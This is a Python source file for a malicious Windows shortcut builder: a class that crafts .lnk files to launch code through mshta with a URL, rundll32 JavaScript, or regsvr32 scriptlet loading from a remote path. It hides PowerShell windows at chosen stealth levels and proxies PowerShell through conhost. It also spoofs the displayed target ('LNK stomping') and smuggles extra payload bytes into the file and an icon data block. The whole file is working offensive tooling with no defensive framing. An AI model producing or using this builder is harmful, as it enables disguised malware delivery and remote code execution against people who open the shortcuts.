import struct
from datetime import datetime
import pylnk3

class LNKEngine:
    WINDOW_NORMAL = 'Normal'
    WINDOW_MAXIMIZED = 'Maximized'
    WINDOW_MINIMIZED = 'Minimized'

    @staticmethod
    def _build_shell_item_list(target_path):
        target_split = target_path.split('\\')
        target_file = target_split[-1]
        target_drive = target_split[0]

        def build_entry(name, is_dir):
            entry = pylnk3.PathSegmentEntry()
            entry.type = pylnk3.TYPE_FOLDER if is_dir else pylnk3.TYPE_FILE
            entry.file_size = 0
            n = datetime.now()
            entry.modified = n
            entry.created = n
            entry.accessed = n
            entry.short_name = name
            entry.full_name = name
            return entry

        elements = [pylnk3.RootEntry(pylnk3.ROOT_MY_COMPUTER), pylnk3.DriveEntry(target_drive)]
        for level in target_split[1:-1]:
            if level:
                elements.append(build_entry(level, is_dir=True))
        elements.append(build_entry(target_file, is_dir=False))
        id_list = pylnk3.LinkTargetIDList()
        id_list.items = elements
        return id_list

    @staticmethod
    def _append_icon_environment_block(lnk_path: str, payload_bytes: bytes):
        MAGIC = b'GHOSTLNK'
        data = MAGIC + payload_bytes
        unicode_data = data.decode('latin-1').encode('utf-16le')
        if len(unicode_data) > 520:
            raise ValueError("Payload too large for IconEnvironmentDataBlock (max 520 bytes)")
        unicode_data = unicode_data.ljust(520, b'\x00')
        block_size = 4 + 4 + 260 + 520
        block = struct.pack('<II', block_size, 0xA0000007)
        block += b'\x00' * 260
        block += unicode_data
        with open(lnk_path, 'ab') as f:
            f.write(block)

    @staticmethod
    def create_lnk(output_filename, target_path, arguments, icon_path, icon_index,
                   description, working_dir=None, stealth_level=0, hide_powershell=False,
                   use_proxy=False, spoof_target_path=None, regsvr32_unc=None,
                   mshta_url=None, rundll32_js=None, appended_payload=None, icon_payload=None):
        # mshta mode overrides
        if mshta_url:
            target_path = r"C:\Windows\System32\mshta.exe"
            arguments = f'"{mshta_url}"'
            hide_powershell = False
            stealth_level = 0
            use_proxy = False
            regsvr32_unc = None

        # rundll32 mode overrides
        if rundll32_js:
            target_path = r"C:\Windows\System32\rundll32.exe"
            arguments = f'javascript:"\\..\\mshtml,RunHTMLApplication";{rundll32_js}'
            hide_powershell = False
            stealth_level = 0
            use_proxy = False
            regsvr32_unc = None

        # regsvr32 mode overrides
        if regsvr32_unc:
            target_path = r"C:\Windows\System32\regsvr32.exe"
            arguments = f'/s /n /i:"{regsvr32_unc}" scrobj.dll'
            hide_powershell = False
            stealth_level = 0
            use_proxy = False

        # Proxy modification (conhost.exe)
        is_powershell = target_path.lower().endswith("powershell.exe")
        if use_proxy and is_powershell and not (regsvr32_unc or mshta_url or rundll32_js):
            target_path = r"C:\Windows\System32\conhost.exe"
            arguments = f'powershell.exe {arguments}'

        target_split = target_path.split('\\')
        target_file = target_split[-1]
        target_drive = target_split[0]
        target_directory = working_dir or '\\'.join(target_split[:-1])

        lnk = pylnk3.create(output_filename)
        if not spoof_target_path:
            lnk.specify_local_location(target_path)

        lnk._link_info.size_local_volume_table = 0
        lnk._link_info.volume_label = ""
        lnk._link_info.drive_serial = 0
        lnk._link_info.local = True
        lnk._link_info.local_base_path = target_path

        if is_powershell and not (regsvr32_unc or mshta_url or rundll32_js):
            is_e_arg = arguments.startswith('-E ')
            is_c_arg = arguments.startswith('-Command ')
            if hide_powershell:
                if use_proxy:
                    if is_e_arg:
                        args_without_pwsh = arguments[14:]
                        encoded = args_without_pwsh[3:]
                        arguments = f'powershell.exe -WindowStyle Hidden -E {encoded}'
                    elif is_c_arg:
                        cmd = arguments[9:]
                        arguments = f'powershell.exe -WindowStyle Hidden -Command {cmd}'
                    elif arguments.startswith('powershell.exe '):
                        arguments = arguments.replace('powershell.exe ', 'powershell.exe -WindowStyle Hidden ')
                else:
                    if is_e_arg:
                        encoded = arguments[3:]
                        arguments = f'-WindowStyle Hidden -E {encoded}'
                    elif is_c_arg:
                        cmd = arguments[9:]
                        arguments = f'-WindowStyle Hidden -Command {cmd}'
                lnk.window_mode = LNKEngine.WINDOW_MINIMIZED
            else:
                if stealth_level == 2:
                    if use_proxy:
                        if is_e_arg:
                            args_without_pwsh = arguments[14:]
                            encoded = args_without_pwsh[3:]
                            arguments = f'powershell.exe -E {encoded}'
                    else:
                        if is_e_arg:
                            encoded = arguments[3:]
                            arguments = f'-E {encoded}'
                    lnk.window_mode = LNKEngine.WINDOW_MINIMIZED
                elif stealth_level == 1:
                    if use_proxy:
                        if is_e_arg:
                            args_without_pwsh = arguments[14:]
                            encoded = args_without_pwsh[3:]
                            arguments = f'powershell.exe -W 1 -E {encoded}'
                        elif is_c_arg:
                            cmd = arguments[9:]
                            arguments = f'powershell.exe -W 1 -Command {cmd}'
                        elif arguments.startswith('powershell.exe '):
                            arguments = arguments.replace('powershell.exe ', 'powershell.exe -W 1 ')
                    else:
                        if is_e_arg:
                            encoded = arguments[3:]
                            arguments = f'-W 1 -E {encoded}'
                        elif is_c_arg:
                            cmd = arguments[9:]
                            arguments = f'-W 1 -Command {cmd}'
                    lnk.window_mode = LNKEngine.WINDOW_MINIMIZED
                else:
                    lnk.window_mode = LNKEngine.WINDOW_NORMAL
        else:
            lnk.window_mode = LNKEngine.WINDOW_NORMAL

        if arguments:
            lnk.arguments = arguments

        lnk.icon = icon_path
        lnk.icon_index = icon_index
        lnk.working_dir = target_directory
        if description:
            lnk.description = description

        # LNK Stomping
        if spoof_target_path:
            fake_id_list = LNKEngine._build_shell_item_list(spoof_target_path)
            lnk.shell_item_id_list = fake_id_list
            lnk._link_info.local_base_path = spoof_target_path
            lnk._link_info.local = True
        else:
            def build_entry(name, is_dir):
                entry = pylnk3.PathSegmentEntry()
                entry.type = pylnk3.TYPE_FOLDER if is_dir else pylnk3.TYPE_FILE
                entry.file_size = 0
                n = datetime.now()
                entry.modified = n
                entry.created = n
                entry.accessed = n
                entry.short_name = name
                entry.full_name = name
                return entry
            elements = [pylnk3.RootEntry(pylnk3.ROOT_MY_COMPUTER), pylnk3.DriveEntry(target_drive)]
            for level in target_split[1:-1]:
                if level:
                    elements.append(build_entry(level, is_dir=True))
            elements.append(build_entry(target_file, is_dir=False))
            id_list = pylnk3.LinkTargetIDList()
            id_list.items = elements
            lnk.shell_item_id_list = id_list

        with open(output_filename, 'wb') as f:
            lnk.write(f)
            if appended_payload:
                f.write(appended_payload)
        if icon_payload:
            LNKEngine._append_icon_environment_block(output_filename, icon_payload)

        return True
